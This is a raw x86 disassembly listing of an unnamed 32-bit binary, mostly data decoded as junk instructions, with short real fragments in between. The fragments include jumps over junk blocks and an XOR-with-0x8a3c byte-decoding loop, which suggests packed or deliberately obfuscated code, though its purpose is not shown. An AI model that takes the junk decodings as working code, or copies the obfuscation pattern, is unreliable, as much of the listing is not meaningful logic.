  40320e:	xor    DWORD PTR [ebp+0x45c7f89c],eax
  403214:	lock xor al,BYTE PTR [ebp+0xd09f89c]
  40321b:	out    dx,eax
  40321c:	in     al,dx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42eccb
  403229:	adc    DWORD PTR ds:0x4303d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e6c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430361,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	jns    0x4031eb
  40325e:	sti    
  40325f:	icebp  
  403260:	rcl    BYTE PTR [esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x403269
  403269:	imul   ecx,DWORD PTR [edx-0x1aabe075],0xffffffb4
  403270:	jb     0x403251
  403272:	mov    WORD PTR [ebx+0xc],es
  403275:	fwait
  403276:	arpl   WORD PTR [ebp-0x76],bp
  403279:	cmp    eax,0xe0a3210e
  40327e:	loop   0x403208
  403280:	add    ch,BYTE PTR [esi-0x74]
  403283:	mov    ebx,0xd871b25f
  403288:	sbb    ecx,DWORD PTR [esi+0x7dc68150]
  40328e:	cmp    bl,BYTE PTR [ecx]
  403290:	fiadd  DWORD PTR [ebp+0x77]
  403293:	fbld   TBYTE PTR [ecx]
  403295:	mov    DWORD PTR [edi-0x1f],ebp
  403298:	ror    BYTE PTR [esi-0x54],cl
  40329b:	xor    BYTE PTR [edx+0x61],ah
  40329e:	adc    eax,0x988261d4
  4032a3:	inc    esi
  4032a4:	dec    edx
  4032a5:	lea    ebp,[edi-0x402e477]
  4032ab:	jb     0x4032e7
  4032ad:	mov    bh,0xeb
  4032af:	inc    esp
  4032b0:	and    edx,edx
  4032b2:	pop    ecx
  4032b3:	adc    eax,0x5cac84be
  4032b8:	stc    
  4032b9:	push   0x23
  4032bb:	mov    esi,0xaac4bab7
  4032c0:	mov    bl,0x95
  4032c2:	xchg   edx,eax
  4032c3:	mov    BYTE PTR [esp+edx*4],cl
  4032c6:	mov    bp,0x59a4
  4032ca:	lahf   
  4032cb:	loope  0x4032f3
  4032cd:	adc    dh,0x1e
  4032d0:	and    eax,0x93ee0635
  4032d5:	sbb    eax,0x1a519744
  4032da:	sub    al,0x79
  4032dc:	inc    edi
  4032dd:	scas   al,BYTE PTR es:[edi]
  4032de:	jne    0x40326d
  4032e0:	test   BYTE PTR es:[edx-0x569b9f2c],0x4
  4032e8:	sub    DWORD PTR [eax+0x1d6479ac],eax
  4032ee:	fndisi(8087 only) 
  4032f0:	aam    0xd4
  4032f2:	fild   WORD PTR [ecx+0x48e1170c]
  4032f8:	sbb    al,0x54
  4032fa:	imul   esp,esi,0x2f
  4032fd:	hlt    
  4032fe:	sub    eax,0x4587cbf2
  403303:	dec    ebp
  403304:	daa    
  403305:	add    esi,DWORD PTR [ebx+edi*4]
  403308:	pushf  
  403309:	dec    edi
  40330a:	les    edx,FWORD PTR [esi+esi*4-0x1d]
  40330e:	enter  0x4de2,0xce
  403312:	(bad)  [eax+ecx*4-0x7a]
  403316:	mov    esi,0xef1570ce
  40331b:	iret   
  40331c:	cmc    
  40331d:	xchg   ebp,eax
  40331e:	add    al,ah
  403320:	or     cl,BYTE PTR [esi+ecx*8]
  403323:	pushf  
  403324:	loopne 0x4033a2
  403326:	int3   
  403327:	add    eax,0x4ccd0546
  40332c:	sub    al,0x9d
  40332e:	inc    edi
  40332f:	adc    bh,ah
  403331:	or     eax,0xa7507ddb
  403336:	xor    eax,0xf5a1aee5
  40333b:	push   esi
  40333c:	pop    eax
  40333d:	push   eax
  40333e:	or     DWORD PTR [ebx+0xa],ebx
  403341:	pop    ss
  403342:	dec    ecx
  403343:	(bad)  
  403345:	repnz in eax,dx
  403347:	mov    eax,ds:0xa450f831
  40334c:	mov    esp,0xb0ba1783
  403351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403352:	rcl    BYTE PTR [eax],0xc4
  403355:	push   0xffffffc8
  403357:	aaa    
  403358:	pop    ss
  403359:	pop    eax
  40335a:	ficom  DWORD PTR [eax]
  40335c:	ror    DWORD PTR [ecx],1
  40335e:	stos   DWORD PTR es:[edi],eax
  40335f:	int3   
  403360:	(bad)  
  403361:	pop    DWORD PTR [ebx+0x5be54dee]
  403367:	(bad)  
  403368:	jg     0x403302
  40336a:	shl    ecx,0xbc
  40336d:	sbb    al,0xe9
  40336f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403370:	mov    eax,ds:0xa97ea1a1
  403375:	es pop ebp
  403377:	push   cs
  403378:	mov    WORD PTR [esi+0xab64ea7],ds
  40337e:	dec    edi
  40337f:	push   0xffffff9b
  403381:	arpl   WORD PTR [ebp+0x31],bx
  403384:	repz aam 0x56
  403387:	repnz push edi
  403389:	adc    eax,0xa697bbcd
  40338e:	(bad)  
  40338f:	lock ja 0x4033c7
  403392:	add    al,0x4d
  403394:	xor    eax,0x439aef0d
  403399:	mov    ds:0x4f454cf8,eax
  40339e:	loopne 0x403401
  4033a0:	loopne 0x403390
  4033a2:	sub    ebp,DWORD PTR [edi]
  4033a4:	or     DWORD PTR [edx+0x36],edx
  4033a7:	leave  
  4033a8:	sub    BYTE PTR [edx+0x4b],ch
  4033ab:	xor    al,0xc
  4033ad:	dec    esp
  4033ae:	out    dx,al
  4033af:	addr16 xchg edi,eax
  4033b1:	ret    0x7b71
  4033b4:	push   ebp
  4033b5:	xor    edx,DWORD PTR [esi+0x6a]
  4033b8:	jmp    0x84d05d29
  4033bd:	push   esi
  4033be:	repz scas al,BYTE PTR es:[edi]
  4033c0:	cmc    
  4033c1:	xor    eax,0x854addc
  4033c6:	sahf   
  4033c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033c8:	stc    
  4033c9:	dec    BYTE PTR [eax+0x1ae9df7c]
  4033cf:	mov    esi,0xf4e0231f
  4033d4:	mov    dh,0x6b
  4033d6:	sti    
  4033d7:	push   ecx
  4033d8:	je     0x403407
  4033da:	jne    0x4033ec
  4033dc:	or     ch,BYTE PTR [ebx]
  4033de:	push   0xffffffb9
  4033e0:	jo     0x4033e2
  4033e2:	ret    
  4033e3:	loop   0x4033ca
  4033e5:	retf   0xfb35
  4033e8:	push   esp
  4033e9:	daa    
  4033ea:	push   ss
  4033eb:	mov    al,ds:0xdf5b0c5d
  4033f0:	scas   eax,DWORD PTR es:[edi]
  4033f1:	pop    edi
  4033f2:	out    dx,al
  4033f3:	cmp    esp,DWORD PTR [ebx+0x211b5463]
  4033f9:	and    dh,BYTE PTR [ebx+0x2d62a443]
  4033ff:	leave  
  403400:	pushw  cs
  403402:	inc    ebx
  403403:	lahf   
  403404:	xchg   esi,eax
  403405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403406:	idiv   DWORD PTR [ebp-0x328fe392]
  40340c:	and    eax,0xf4c4fd50
  403411:	or     DWORD PTR [esi-0x22],0xffffff80
  403415:	clc    
  403416:	jle    0x4033b1
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x430359
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	nop
  403453:	sar    BYTE PTR [edx+0x48],0x2
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x4033f1
  40345f:	add    ecx,DWORD PTR [ecx+ecx*4]
  403462:	cmp    edi,edi
  403464:	fcomp  DWORD PTR [esi+0x14]
  403467:	aas    
  403468:	mov    ch,0xb
  40346a:	inc    eax
  40346b:	mul    edi
  40346d:	(bad)  
  40346e:	ins    DWORD PTR es:[edi],dx
  40346f:	sbb    al,0xb2
  403471:	test   DWORD PTR [ebx+ebx*2-0x46be2cb0],0xb6bf7eeb
  40347c:	sub    edi,DWORD PTR [eax]
  40347e:	jg     0x4034fc
  403480:	xor    dl,bh
  403482:	pushf  
  403483:	inc    ebp
  403484:	mov    bh,ah
  403486:	loop   0x4034e9
  403488:	aaa    
  403489:	int3   
  40348a:	iret   
  40348b:	pop    edi
  40348c:	fbstp  TBYTE PTR [ebx]
  40348e:	aam    0x60
  403490:	(bad)  ds:0xa0d799ff
  403496:	jge    0x40346d
  403498:	mov    ecx,0xcdc7b78f
  40349d:	mov    ah,0xfe
  40349f:	jg     0x40347e
  4034a1:	add    bl,BYTE PTR [esi+0x517ac951]
  4034a7:	add    cl,BYTE PTR [ebx]
  4034a9:	xchg   edx,eax
  4034aa:	jae    0x403433
  4034ac:	sbb    eax,0x91087358
  4034b1:	add    ecx,DWORD PTR [edx-0xb15b7c4]
  4034b7:	dec    eax
  4034b8:	jnp    0x4034a4
  4034ba:	sub    DWORD PTR [ebx+0x63db3210],edi
  4034c0:	ja     0x403524
  4034c2:	xor    eax,0xb8cac11c
  4034c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c8:	and    esi,DWORD PTR [esi-0x1a]
  4034cb:	rcr    BYTE PTR [ebx+0x39fb08e2],cl
  4034d1:	ret    0x6ac0
  4034d4:	addr16 std 
  4034d6:	xchg   cl,ch
  4034d8:	rcl    ch,cl
  4034da:	inc    bp
  4034dc:	stos   BYTE PTR es:[edi],al
  4034dd:	aam    0xf2
  4034df:	leave  
  4034e0:	pop    ss
  4034e1:	daa    
  4034e2:	sbb    dh,0xd4
  4034e5:	pop    esi
  4034e6:	push   esi
  4034e7:	ins    DWORD PTR es:[edi],dx
  4034e8:	scas   al,BYTE PTR es:[edi]
  4034e9:	cmp    BYTE PTR [ebp-0x3293ec2e],cl
  4034ef:	cld    
  4034f0:	pop    ebp
  4034f1:	mov    ebp,0x48c42e47
  4034f6:	adc    eax,0xbf4be0f
  4034fb:	sbb    cl,BYTE PTR [ebx+0x69ae1a7b]
  403501:	es jg  0x4034cb
  403504:	xlat   BYTE PTR ds:[ebx]
  403505:	mov    dh,0xd1
  403507:	into   
  403508:	cmp    DWORD PTR [ebx+0x6ae4eaea],ecx
  40350e:	dec    esi
  40350f:	add    ebx,edi
  403511:	in     al,dx
  403512:	test   al,0x2b
  403514:	fidiv  WORD PTR [ebx+eiz*4+0x6b]
  403518:	and    DWORD PTR [edx+ebp*2+0x659fab24],esp
  40351f:	mov    cl,0x84
  403521:	pop    ebx
  403522:	retf   
  403523:	(bad)  
  403525:	stc    
  403526:	jae    0x403562
  403528:	ss es pop ebp
  40352b:	inc    edi
  40352c:	and    BYTE PTR [edx+0xf],0xf1
  403530:	mov    BYTE PTR ds:0x8858e385,cl
  403536:	jnp    0x403518
  403538:	xor    cl,BYTE PTR [eax+0x74030084]
  40353e:	in     eax,0x12
  403540:	cmp    dh,BYTE PTR [edi-0x79]
  403543:	test   al,0x61
  403545:	add    al,0x2c
  403547:	ret    0x80
  40354a:	inc    edx
  40354b:	mov    ah,0xbe
  40354d:	mov    ?,WORD PTR [ecx-0x55fec71e]
  403553:	pop    edx
  403554:	aaa    
  403555:	inc    esp
  403556:	fwait
  403557:	daa    
  403558:	cmp    esp,esi
  40355a:	call   0x31eb:0xaa597a10
  403561:	jbe    0x4035cc
  403563:	push   edi
  403564:	or     al,0x6b
  403566:	das    
  403567:	lea    edx,ds:[eax]
  40356a:	adc    edx,edi
  40356c:	jmp    0x403532
  40356e:	iret   
  40356f:	push   eax
  403570:	mov    eax,ds:0x24344e0
  403575:	lea    esp,[esi-0x2c]
  403578:	or     al,0xb1
  40357a:	push   edx
  40357b:	test   eax,0x255f55ed
  403580:	inc    ebx
  403581:	jecxz  0x4035a3
  403583:	rol    DWORD PTR [ecx+0x48],1
  403586:	mov    esp,0x3a152e9e
  40358b:	call   0xa4624b0b
  403590:	xchg   edx,eax
  403591:	test   eax,0xf5394acb
  403596:	dec    ebx
  403597:	push   esi
  403598:	dec    ebx
  403599:	in     al,dx
  40359a:	fcomp  QWORD PTR [esi+0x5f]
  40359d:	xchg   edx,eax
  40359e:	mov    ds:0x295e1534,al
  4035a3:	arpl   WORD PTR [eax+0x70],bx
  4035a6:	push   0xffffff9d
  4035a8:	jb     0x4035d3
  4035aa:	repz out dx,eax
  4035ac:	jmp    FWORD PTR ds:[edi+0x42a3363e]
  4035b3:	aam    0xa1
  4035b5:	ror    DWORD PTR [ecx*8+0x6d56ed7],cl
  4035bc:	mov    ebx,0x37463065
  4035c1:	or     BYTE PTR [edi],al
  4035c3:	xchg   ecx,eax
  4035c4:	bound  ebx,QWORD PTR [ebp-0x1213d897]
  4035ca:	mov    bh,0x6f
  4035cc:	mov    eax,ds:0x6d8c74e9
  4035d1:	or     eax,0xd5d9bb91
  4035d6:	xchg   BYTE PTR [eax],al
  4035d8:	ja     0x4035f7
  4035da:	sti    
  4035db:	lds    eax,FWORD PTR [edx+0x66]
  4035de:	cwde   
  4035df:	out    0x2f,eax
  4035e1:	test   dl,ah
  4035e3:	fs dec edi
  4035e5:	jno    0x4035ec
  4035e7:	sbb    al,0x99
  4035e9:	mov    ch,0x45
  4035eb:	sub    esi,edx
  4035ed:	in     al,dx
  4035ee:	leave  
  4035ef:	add    eax,eax
  4035f1:	imul   ebp,DWORD PTR [ebx+ebx*1-0xd],0x4c
  4035f6:	or     eax,0xd3a82f3b
  4035fb:	sbb    BYTE PTR [edx+ebx*1],dh
  4035fe:	mov    cl,0x26
  403600:	lock inc esp
  403602:	dec    edi
  403603:	fbld   TBYTE PTR [edx*2-0x60a5ce16]
  40360a:	aas    
  40360b:	pop    esp
  40360c:	xlat   BYTE PTR ds:[ebx]
  40360d:	mov    BYTE PTR [ebx],dh
  40360f:	rol    DWORD PTR [ebx],1
  403611:	(bad)  
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0xeb3dd7c8
  40366f:	cmp    al,bh
  403671:	adc    esi,DWORD PTR [edx-0x518181eb]
  403677:	jg     0x4036f7
  403679:	jle    0x40364d
  40367b:	xchg   esi,eax
  40367c:	sub    eax,0xc4c83f06
  403681:	mov    al,0x2d
  403683:	xchg   esi,eax
  403684:	cs xor ebp,ecx
  403687:	int3   
  403688:	mov    ecx,DWORD PTR [ebp-0x3337a324]
  40368e:	dec    ebp
  40368f:	dec    ebx
  403690:	dec    ecx
  403691:	xchg   DWORD PTR [edi-0x757f6026],ebx
  403697:	fisttp DWORD PTR [eax-0x6bebec9c]
  40369d:	sbb    eax,ebx
  40369f:	in     al,dx
  4036a0:	or     al,0x41
  4036a2:	xchg   esp,eax
  4036a3:	lds    eax,FWORD PTR [esp+edx*4+0x68bd728f]
  4036aa:	in     eax,dx
  4036ab:	mov    edi,0x2813803f
  4036b0:	xchg   esi,eax
  4036b1:	stos   BYTE PTR es:[edi],al
  4036b2:	lds    edi,FWORD PTR [edx-0x2c]
  4036b5:	mov    edi,0x2f31a9d3
  4036ba:	and    bl,al
  4036bc:	pop    ebp
  4036bd:	mov    ecx,0xe70ee645
  4036c2:	lock jne 0x4036df
  4036c5:	sub    BYTE PTR [ebx+0x127e0aa7],0x45
  4036cc:	inc    ebx
  4036cd:	jle    0x40372a
  4036cf:	leave  
  4036d0:	mov    ah,0x81
  4036d2:	push   ebp
  4036d3:	test   BYTE PTR [ebp+0x67],cl
  4036d6:	xor    BYTE PTR [ebp-0x27],cl
  4036d9:	push   edi
  4036da:	adc    al,0x96
  4036dc:	sbb    eax,0xd01a6756
  4036e1:	fidivr DWORD PTR ds:0xfce1619b
  4036e7:	loop   0x4036ac
  4036e9:	inc    ebp
  4036ea:	addr16 xchg edx,eax
  4036ec:	shl    ch,cl
  4036ee:	mov    DWORD PTR [eax],ebx
  4036f0:	dec    ebx
  4036f1:	sbb    cl,BYTE PTR [eax]
  4036f3:	jns    0x40374f
  4036f5:	hlt    
  4036f6:	rcl    BYTE PTR [edi-0x5b],0xc1
  4036fa:	jmp    0x40372e
  4036fc:	inc    edi
  4036fd:	sahf   
  4036fe:	mov    ds:0xe7951325,al
  403703:	pop    esp
  403704:	pop    esi
  403705:	push   ebp
  403706:	ret    
  403707:	sahf   
  403708:	xor    al,0x98
  40370a:	(bad)  
  40370b:	retf   0x95c
  40370e:	nop
  40370f:	push   eax
  403710:	shl    DWORD PTR [eax-0x54fc7cb6],1
  403716:	or     al,0x68
  403718:	inc    edx
  403719:	mov    ds:0x8cea3a53,al
  40371e:	jo     0x403719
  403720:	adc    bl,BYTE PTR [edi]
  403722:	xor    DWORD PTR ds:0x5094c875,0xffffffd4
  403729:	lds    ebx,FWORD PTR [edx-0x7]
  40372c:	cmp    eax,eax
  40372e:	(bad)  
  40372f:	pusha  
  403730:	or     dh,ah
  403732:	adc    edx,DWORD PTR [ecx-0x28e7d505]
  403738:	fimul  WORD PTR [edi]
  40373a:	idiv   DWORD PTR gs:[eax+eiz*1+0x1db5482d]
  403742:	dec    esi
  403743:	jl     0x4037ba
  403745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403746:	add    BYTE PTR [ebx+0x1623a3a3],0x9d
  40374d:	bound  esp,QWORD PTR [ebx+0x6a]
  403750:	push   esp
  403751:	inc    ebx
  403752:	sti    
  403753:	mov    bh,0xae
  403755:	xchg   ebp,eax
  403756:	icebp  
  403757:	xor    al,0xb3
  403759:	and    eax,0xac166eeb
  40375e:	dec    eax
  40375f:	jmp    0x40374e
  403761:	bound  esp,QWORD PTR [edx]
  403763:	pop    esi
  403764:	vpcmpgtd xmm7,xmm2,xmm4
  403768:	add    ebp,DWORD PTR [ecx-0x1f]
  40376b:	nop
  40376c:	popf   
  40376d:	xchg   ebp,eax
  40376e:	jne    0x403766
  403770:	push   ss
  403771:	push   ss
  403772:	call   0x4f0622c7
  403777:	pop    ebp
  403778:	imul   edx,esp,0xffffffb4
  40377b:	in     eax,dx
  40377c:	js     0x40376e
  40377e:	ret    
  40377f:	push   esi
  403780:	mov    ebp,0x2e43a7a5
  403785:	adc    ch,dl
  403787:	mov    ds:0x4c89ac63,al
  40378c:	inc    ebx
  40378d:	xchg   BYTE PTR [esi],bh
  40378f:	pusha  
  403790:	aaa    
  403791:	pop    esp
  403792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403793:	sub    eax,DWORD PTR [ecx-0x2774e6cf]
  403799:	icebp  
  40379a:	pop    esi
  40379b:	xchg   ebx,eax
  40379c:	imul   eax,DWORD PTR [edx-0x4e19b74f],0xffffffd6
  4037a3:	gs adc bl,bh
  4037a6:	jns    0x403731
  4037a8:	test   DWORD PTR [eax+eax*2+0x57],0x2ab1098
  4037b0:	ds inc eax
  4037b2:	inc    edi
  4037b3:	das    
  4037b4:	retf   0x2655
  4037b7:	nop
  4037b8:	fcmovbe st,st(4)
  4037ba:	cdq    
  4037bb:	mov    al,0x52
  4037bd:	(bad)  
  4037be:	imul   esp,DWORD PTR [edi],0x926437ff
  4037c4:	jns    0x403802
  4037c6:	nop
  4037c7:	hlt    
  4037c8:	mov    al,ds:0x87fb4286
  4037cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037cf:	pusha  
  4037d0:	(bad)  
  4037d1:	xor    eax,0x6c28fc9
  4037d6:	mov    bh,0xcd
  4037d8:	jle    0x403771
  4037da:	rcl    BYTE PTR [edx],0xea
  4037dd:	or     DWORD PTR [eax],0xffffffce
  4037e0:	add    eax,0x963ce77c
  4037e5:	pop    edx
  4037e6:	out    0x84,eax
  4037e8:	or     BYTE PTR [ebx-0x7a],al
  4037eb:	cs xchg ebx,eax
  4037ed:	(bad)  [edi+0x15b1236b]
  4037f3:	js     0x4037c4
  4037f5:	sti    
  4037f6:	ss pop ebx
  4037f8:	aas    
  4037f9:	mov    bh,0x2f
  4037fb:	ret    0x34bd
  4037fe:	popa   
  4037ff:	push   esp
  403800:	jno    0x40380f
  403802:	outs   dx,BYTE PTR ds:[esi]
  403803:	js     0x403839
  403805:	push   0x985b1bbd
  40380a:	pushf  
  40380b:	adc    edx,esp
  40380d:	(bad)  
  40380e:	repnz sbb eax,DWORD PTR [esi]
  403811:	mov    BYTE PTR [edx-0x7a],bh
  403814:	js     0x40381d
  403816:	xor    al,ch
  403818:	or     ecx,0x85d0da6d
  40381e:	sbb    cl,BYTE PTR [edx-0x5f6a58af]
  403824:	push   cs
  403825:	retf   
  403826:	dec    edx
  403827:	lods   eax,DWORD PTR ds:[esi]
  403828:	(bad)  
  403829:	or     DWORD PTR [ebx-0x3eccefab],0xc8e9c603
  403833:	add    DWORD PTR [eax],eax
  403835:	add    BYTE PTR [eax+eiz*1-0x4f],bh
  403839:	mov    al,0xb1
  40383b:	mov    cl,0x7d
  40383d:	mov    al,0xdd
  40383f:	pop    es
  403840:	call   0x6c817523
  403845:	shl    edx,1
  403847:	adc    edi,DWORD PTR [esi+0x7e]
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x403889
  40384f:	xor    BYTE PTR [edx+0x52],cl
  403852:	test   eax,0xb394c767
  403857:	adc    eax,0xe5326d22
  40385c:	dec    ebp
  40385d:	sbb    dl,BYTE PTR [ebp+esi*1+0x20]
  403861:	jns    0x4038a9
  403863:	mov    edx,0x6596963c
  403868:	test   BYTE PTR [edx+0x1f],bh
  40386b:	sub    dh,BYTE PTR [edx+eax*1]
  40386e:	mov    dl,0x23
  403870:	test   al,0x57
  403872:	lock js 0x40384c
  403875:	into   
  403876:	std    
  403877:	cmp    BYTE PTR [esi],bl
  403879:	div    DWORD PTR [eax-0x60fc4355]
  40387f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403880:	xor    eax,DWORD PTR [ebp-0x7d]
  403883:	pop    ebx
  403884:	in     al,0x83
  403886:	sti    
  403887:	mov    BYTE PTR [edi-0x7a],bh
  40388a:	call   0xb88bf800
  40388f:	aas    
  403890:	test   al,0x1f
  403892:	mov    ch,0x1
  403894:	(bad)  
  403895:	das    
  403896:	scas   al,BYTE PTR es:[edi]
  403897:	sub    DWORD PTR [ecx+0x6a],0x9802a544
  40389e:	inc    esi
  40389f:	jl     0x403865
  4038a1:	jecxz  0x403840
  4038a3:	shl    BYTE PTR [ecx],0xc8
  4038a6:	dec    esi
  4038a7:	loop   0x4038be
  4038a9:	int3   
  4038aa:	or     cl,ah
  4038ac:	out    0xe1,eax
  4038ae:	push   ecx
  4038af:	cmp    BYTE PTR [edi],cl
  4038b1:	and    cl,BYTE PTR [ecx+edi*1+0x36770030]
  4038b8:	inc    ebp
  4038b9:	xor    eax,0x8037cee8
  4038be:	inc    esi
  4038bf:	fld    QWORD PTR [esi+edx*2-0x3d318bf]
  4038c6:	xchg   esi,eax
  4038c7:	inc    eax
  4038c8:	repnz dec edx
  4038ca:	addps  xmm4,xmm4
  4038cd:	jg     0x4038ad
  4038cf:	loop   0x403864
  4038d1:	je     0x403865
  4038d3:	ret    
  4038d4:	jns    0x40386d
  4038d6:	xor    al,0xda
  4038d8:	inc    edx
  4038d9:	dec    eax
  4038da:	cmp    eax,0x9e77695c
  4038df:	scas   eax,DWORD PTR es:[edi]
  4038e0:	imul   ebp,DWORD PTR [edx+esi*4],0xc45fe116
  4038e7:	pop    ds
  4038e8:	cmp    eax,esp
  4038ea:	outs   dx,BYTE PTR ds:[esi]
  4038eb:	rcr    esp,0x3f
  4038ee:	xchg   edi,eax
  4038ef:	lahf   
  4038f0:	rcr    BYTE PTR [ebx-0x5e],0xae
  4038f4:	mov    dl,0x7a
  4038f6:	cmp    ah,0x9a
  4038f9:	(bad)  
  4038fa:	pushf  
  4038fb:	mov    DWORD PTR [ecx],eax
  4038fd:	mov    esi,0xa899d903
  403902:	nop
  403903:	test   eax,0x2a6797b9
  403908:	in     eax,0x17
  40390a:	mov    al,0xe3
  40390c:	icebp  
  40390d:	lea    ecx,[edi]
  40390f:	icebp  
  403910:	nop
  403911:	sbb    eax,0x4c8899c3
  403916:	mov    bh,0xbf
  403918:	mov    al,ds:0x305e1f0b
  40391d:	mov    ebx,0xdedd163c
  403922:	cmc    
  403923:	sbb    DWORD PTR [ebx],ebx
  403925:	inc    esp
  403926:	hlt    
  403927:	and    ch,al
  403929:	stc    
  40392a:	xchg   ecx,eax
  40392b:	mov    al,ds:0x8989a49
  403930:	sbb    al,0xb5
  403932:	popf   
  403933:	mov    edx,0x38738ff0
  403938:	out    dx,al
  403939:	mov    ds:0x5379018c,al
  40393e:	jmp    0xc173:0x750d3a8c
  403945:	sahf   
  403946:	leave  
  403947:	mov    ds:0xa3f99c55,al
  40394c:	cli    
  40394d:	das    
  40394e:	mov    edx,0x92647d86
  403953:	fdiv   DWORD PTR [edi]
  403955:	gs mov ecx,0xfad633dd
  40395b:	add    BYTE PTR [esi+ebx*2-0x5b],ch
  40395f:	xor    edi,edi
  403961:	loop   0x403986
  403963:	mov    ch,0x74
  403965:	aas    
  403966:	js     0x403928
  403968:	div    esi
  40396a:	jp     0x40398c
  40396c:	push   ss
  40396d:	or     esp,DWORD PTR [esp+edi*8-0x594d36c1]
  403974:	fidivr WORD PTR ds:0x60c459f7
  40397a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40397b:	test   eax,0x18559a87
  403980:	in     al,dx
  403981:	push   ebp
  403982:	push   ebp
  403983:	or     BYTE PTR [ecx+eax*1+0x37f175ea],bl
  40398a:	xor    BYTE PTR [eax],ch
  40398c:	in     eax,0xd0
  40398e:	add    eax,0xadd74841
  403993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403994:	std    
  403995:	jl     0x403951
  403997:	adc    eax,0x8d433116
  40399c:	loop   0x40393f
  40399e:	add    edx,DWORD PTR [ecx+0x57]
  4039a1:	and    ch,BYTE PTR [esi-0x23e2b30a]
  4039a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039a8:	jae    0x40394a
  4039aa:	mov    cl,0xc3
  4039ac:	mov    ds:0x6a872344,al
  4039b1:	cmp    al,0xd9
  4039b3:	push   eax
  4039b4:	pop    ecx
  4039b5:	popa   
  4039b6:	sub    BYTE PTR ds:[eax-0x51e5955b],0x74
  4039be:	repz sar DWORD PTR [edi-0x23141b57],0x9d
  4039c6:	jbe    0x403978
  4039c8:	cmp    ecx,esi
  4039ca:	pop    ebp
  4039cb:	xchg   esp,eax
  4039cc:	(bad)  
  4039cd:	shr    DWORD PTR [edx+0x10],cl
  4039d0:	or     BYTE PTR [ecx-0x39],cl
  4039d3:	push   ebp
  4039d4:	or     cl,BYTE PTR [esi]
  4039d6:	sub    al,0x1b
  4039d8:	cs dec ecx
  4039da:	ret    
  4039db:	inc    ebx
  4039dc:	mov    ecx,0xc4cbca25
  4039e1:	or     edi,DWORD PTR [ecx]
  4039e3:	mov    edi,edx
  4039e5:	jbe    0x403a51
  4039e7:	outs   dx,DWORD PTR ds:[esi]
  4039e8:	xchg   ebx,eax
  4039e9:	pop    ebx
  4039ea:	xor    ebx,DWORD PTR ss:[edx+0x3f]
  4039ee:	test   al,0xee
  4039f0:	or     DWORD PTR [ebx+0x63fab619],ebp
  4039f6:	jge    0x403a07
  4039f8:	stc    
  4039f9:	sub    ch,BYTE PTR [ecx-0x45]
  4039fc:	imul   edi,DWORD PTR [ebp-0x77],0xf8458b02
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
